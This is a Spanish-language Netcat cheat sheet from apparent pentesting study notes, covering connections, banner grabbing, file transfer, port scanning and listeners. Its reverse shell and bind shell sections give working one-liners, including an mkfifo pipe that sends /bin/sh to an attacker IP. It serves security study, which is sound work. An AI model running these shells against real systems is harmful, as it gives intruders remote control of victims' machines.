# Netcat — Cheat Sheet

> Lectura/escritura de conexiones de red, reverse shells, transfers.

---

## Uso básico

```bash
nc <host> <port>                 # Conectar
nc -l <port>                     # Escuchar
nc -v <host> <port>              # Verbose
```

## Banner grabbing

```bash
nc <host> <port>                 # Conectar y ver banner
nc -v <host> 21                  # FTP banner
nc -v <host> 25                  # SMTP banner
```

## Transferencia de archivos

```bash
# Receptor
nc -lvnp 4444 > archivo_recibido

# Emisor
nc <host> 4444 < archivo_enviar
```

## Reverse shell

```bash
# Víctima
nc -e /bin/sh <attacker_ip> 4444

# Sin -e (si no está compilado con support)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
```

## Bind shell

```bash
# Víctima
nc -lvnp 4444 -e /bin/sh

# Atacante
nc <victim_ip> 4444
```

## Port scanning

```bash
nc -zv <host> 1-1000             # Scan range
nc -zv <host> 80,443             # Scan specific ports
nc -zvn <host> 1-1000            # Sin resolve DNS
```

## Listener con options

```bash
nc -lvnp <port>                  # Listen verbose, numeric, no DNS
nc -k -lvnp <port>               # Keep alive (no cerrar después de conexión)
```


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../08 - Metodologías/Metodología - Explotación Linux.md|Metodología - Explotación Linux]] — Linux, Netcat / Reverse Shells, Post-Explotación
- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Linux, Netcat / Reverse Shells, Post-Explotación
- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Linux, Netcat / Reverse Shells, Post-Explotación
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Linux, Netcat / Reverse Shells, Post-Explotación
- [[../../write-ups/Inj3ctCrew-THL.md|Inj3ctCrew-THL]] — Linux, Netcat / Reverse Shells, Post-Explotación
- [[../../apuntes Chema/Bash Comandos Avanzados.md|Bash Comandos Avanzados]] — Linux, Netcat / Reverse Shells, Reverse Shells

### 🛠️ Herramientas

- [[comandos/Metasploit|Netcat / Reverse Shells]]

> #linux #netcat #post-explotacion #redes #reverse-shell
